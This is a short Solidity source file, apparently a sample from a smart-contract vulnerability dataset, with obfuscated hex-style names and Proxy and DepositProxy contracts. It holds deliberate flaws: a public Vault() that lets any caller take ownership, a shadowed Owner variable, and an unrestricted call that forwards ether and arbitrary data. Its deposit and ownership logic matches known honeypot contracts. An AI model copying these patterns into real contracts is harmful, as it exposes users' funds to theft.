pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x9a4d01 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xf63dc5(address _0xdd4475) public _0x9a4d01 { Owner = _0xdd4475; }
    function _0xe9c073(address _0x4b1114, bytes data) public payable {
        _0x4b1114.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x3774e3();
        }
    }

    function _0x3774e3() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0xbe03b2(uint256 _0x28a98a) public _0x9a4d01 {
        if (_0x28a98a>0 && Deposits[msg.sender]>=_0x28a98a) {
            msg.sender.transfer(_0x28a98a);
        }
    }
}